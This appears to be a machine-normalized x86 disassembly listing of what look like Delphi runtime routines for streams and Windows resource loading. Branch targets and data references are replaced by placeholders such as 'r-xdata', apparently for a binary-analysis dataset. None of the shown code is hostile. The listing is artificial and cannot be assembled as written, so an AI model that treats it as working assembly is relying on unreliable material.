mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_418ad0
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ad7
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402754
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_418984
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_4189bc
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_418ae8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41916c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418b38
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41b1a0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b3f
mov eax [ ebp - 0x8 ]
call sub_403164
retn
sub_418b48
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_418ba4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408300
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_418be4
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c88c
pop ebx
pop ebp
retn 0x8
sub_418c0c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_418c50
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_418c50
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_418d79
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403470
movzx edx di
mov eax esi
call sub_408224
mov ecx eax
xor edx edx
mov eax ebx
call sub_418b48
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4082a0
mov ecx eax
xor edx edx
mov eax ebx
call sub_418b48
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d80
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403ec0
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4083f8
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ac1c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4083f8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ac1c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
jmp r-xdata
sub_418d80
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_418da4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
call sub_408338
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_418de0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_402930
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_418e18
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_418e3c
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_418e68
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_418e80
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_418778
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_418984
sub_418eb8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_418dd8
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_418ee0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_418eb8
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_418f0c
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_4069d4
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_4069b8
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_4069a8
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
test ecx ecx
jne r-xdata
sub_418f98
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_402930
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_418eb8
sub_418fe8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40435c
mov ecx eax
mov edx esi
mov eax edi
call sub_4190b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_419040
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4190a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4190aa
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
sub_4190b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_419040
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_418dd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_419040
pop ecx
sub_41911c
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4069a4
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41916c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_402734
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4191b4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402754
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4192b8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ef0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ef0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_419310
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403f8c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4043fc
mov al 0x1
inc ebx
sub_419368
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4193df
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40575c
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_413eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193e6
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4137c8
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_40575c
mov ecx eax
mov eax esi
pop edx
call sub_40cd80
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_40575c
sub_4193ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_419492
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419499
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f8c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41c9c0
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407cd4
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_4194b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_416b74
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_416b74
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4169bc
sub_4194ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_416b74
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_416b74
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_416a08
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4169bc
sub_419534
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_4196cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_416e84
mov edi eax
xor edx edx
push ebp
push sub_4196ae
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196b5
mov eax [ rw-data ]
call sub_416ee8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41968f
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41963d
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_416b18
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_416664
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419644
mov eax [ ebp - 0x8 ]
call sub_403164
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4138f4
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4194b4
pop ecx
mov edx esi
mov eax edi
call sub_416a08
mov eax ebx
call sub_403164
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4193ec
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_4194ec
pop ecx
inc esi
sub_419644
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403164
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
sub_4196dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416e84
mov edi eax
xor eax eax
push ebp
push sub_419777
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416ee8
retn
mov edx ebx
mov eax edi
call sub_416b18
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_416a08
mov eax esi
call sub_403164
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407cd4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_419788
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416e84
mov edi eax
xor eax eax
push ebp
push sub_4197ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416ee8
retn
mov edx ebx
mov eax edi
call sub_416b18
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_416a08
mov eax esi
call sub_403164
sub_419830
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
pop ecx
pop edx
pop ebx
retn
sub_419874
push ebx
push esi
push edi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4191b4
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4198b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41b788
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41b898
call sub_419824
sub_4198d4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407cd4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403e9c
sub_419908
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407cd4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b788
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4199c9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_419d4c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_419d4c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199d0
mov eax [ ebp - 0x8 ]
call sub_403164
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b898
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_419824
sub_4199f8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_419a18
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404138
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4033d0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_419824
sub_419a80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_416e84
mov esi eax
xor edx edx
push ebp
push sub_419af0
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419af7
mov eax [ rw-data ]
call sub_416ee8
retn
mov edx ebx
mov eax esi
call sub_416b18
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403164
mov edx ebx
mov eax esi
call sub_416a08
sub_419afc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419c0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c12
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
xor edx edx
push ebp
push sub_419bee
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419c40
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_419310
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_416b18
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f34
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4193ec
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_416b18
call sub_419a80
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_416b18
mov edx eax
mov eax [ rw-data ]
call sub_416dfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_416c0c
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_419c1c
push ebx
mov ebx eax
mov eax ebx
call sub_419d10
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_418778
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_419c40
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403164
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_416b18
call sub_403164
inc edi
dec esi
jne r-xdata
sub_419c7c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4030ac
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4161ac
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4030f0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_416224
mov edi eax
mov edx [ esp + 0x4 ]
call sub_416124
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
